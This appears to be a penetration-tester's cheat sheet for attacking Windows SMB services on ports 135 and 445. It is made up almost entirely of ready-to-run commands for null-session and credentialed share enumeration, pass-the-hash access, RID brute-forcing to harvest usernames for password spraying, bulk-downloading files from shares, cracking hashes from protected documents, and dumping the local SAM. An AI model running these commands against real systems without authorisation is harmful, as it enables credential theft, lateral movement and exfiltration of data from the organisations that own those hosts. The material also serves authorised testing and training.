# 135, 445 - SMB

## Tag Meaning

- `#Username #Password` = needs valid username/password
- `#Username #Hash` = NTLM hash works
- `#ProtectedFile #Crack` = has protected document/file and wants to extract a hash
- `#Hash #Crack` = has hash and wants to crack it
- `#Shell` = needs shell/local admin context
- `#SMB #RPC #NTLM` = related service/protocol
- `#Enumeration #Exploitation` = attack type
- OS target tags (`Linux`, `Windows`, `ActiveDirectory`) = target/source type, not runner platform

## Commands

### Anonymous Checks

#SMB #Enumeration
Quick anonymous SMB checks: fingerprint the host and try null-session share access.

```sh
# Fingerprint the target and pull hostname/domain/signing details.
nxc smb <TARGET_IP>

# Test null session / anonymous share access.
nxc smb <TARGET_IP> -u '' -p '' --shares
smbclient -L //<TARGET_IP>/ -N
```

### Credentialed Share Access

#Username #Password #SMB #Enumeration
Check share access with valid creds and open a specific share.

```sh
# List shares with valid credentials.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares
smbmap -H <TARGET_IP> -u <USER> -p '<PASS>'
smbclient -L //<TARGET_IP>/ -U '<DOMAIN>/<USER>%<PASS>'

# Open a specific share.
smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'
```

### SMB Client With NTLM Hash

#Username #Hash #SMB #NTLM #Windows #Enumeration
Open a share with pass-the-hash when plaintext credentials are not available.

```sh
smbclient //<TARGET_IP>/<SHARE> -U <USER> --pw-nt-hash <NTLM_HASH>
```


### Enum4linux Classic User Extraction

#SMB #RPC #Enumeration
Run classic `enum4linux`, extract candidate usernames, review descriptions for hints, and confirm lockout policy before spraying.

```sh
# Run broad checks without creds and save output.
enum4linux -a <TARGET_IP> | tee loot/enum4.txt

# Extract usernames from common enum4linux formats.
{ grep -oP 'user:\[\K[^\]]+' loot/enum4.txt; grep -oP 'Account:\s*\K\S+' loot/enum4.txt; } | grep -viE '^(guest|krbtgt)$' | sort -u | while read -r u; do
  grep -qxF "$u" users.txt 2>/dev/null || echo "$u" >> users.txt
done

# Review descriptions and password-looking lines.
grep -i 'Desc' loot/enum4.txt | grep -oP 'Desc:.*'
grep -iE 'pass|pwd|credential|reminder' loot/enum4.txt

# Check lockout policy before spraying.
grep -iR 'Lockout Threshold' loot/enum4.txt
```

### Credentialed Domain Enum

#Username #Password #SMB #ActiveDirectory #Enumeration
Enumerate domain users, groups, and password policy over SMB with valid creds.

```sh
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --users
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --groups
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --pass-pol

# Authenticated rpcclient.
rpcclient -U '<DOMAIN>\<USER>%<PASS>' <TARGET_IP>
enumdomusers
enumdomgroups
querydominfo
netshareenumall
enumprinters
getdompwinfo
lookupnames admin
```

### RID Brute Username Extraction

#SMB #ActiveDirectory #Enumeration
Use NetExec RID brute to extract domain usernames when anonymous or low-privileged SMB access leaks SIDs.

```sh
nxc smb <TARGET_IP> -u anonymous -p '' --rid-brute 5000 > rid.txt
cat rid.txt | grep SidTypeUser | awk '{print $6}' | cut -d'\\' -f2 | grep -v '\$$' > users.txt
```

### Loot Shares

#Username #Password #SMB #Enumeration #Looting
Search readable shares and download interesting files.

```sh
# Spider all readable shares.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus

# Spider one specific share.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus -o SHARE='<SHARE>'

# Download files from a readable share.
smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'
recurse ON
prompt OFF
mget *

# One-shot download from a specific readable share.
smbclient '//<TARGET_IP>/<SHARE>' -U '<DOMAIN>/<USER>%<PASS>' -c 'recurse ON; prompt OFF; mget *'
```

### Protected Files

#ProtectedFile #Crack
Extract crackable hashes from protected documents.

```sh
# PDF
pdf2john file.pdf > file.hash

# Office documents
office2john file.xlsx > file.hash
office2john file.docx > file.hash
```

### Crack Extracted Hash

#Hash #Crack
Crack the extracted document hash with John.

```sh
john file.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Local Admin With Password

#Username #Password #SMB #Windows #Exploitation
Check local admin rights and dump SAM if the credentials are admin.

```sh
# Check admin rights.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>'

# Dump local SAM if admin.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam
```

### Local Admin With Hash

#Username #Hash #SMB #NTLM #Windows #Exploitation
Check local admin rights with an NTLM hash.

```sh
nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
```
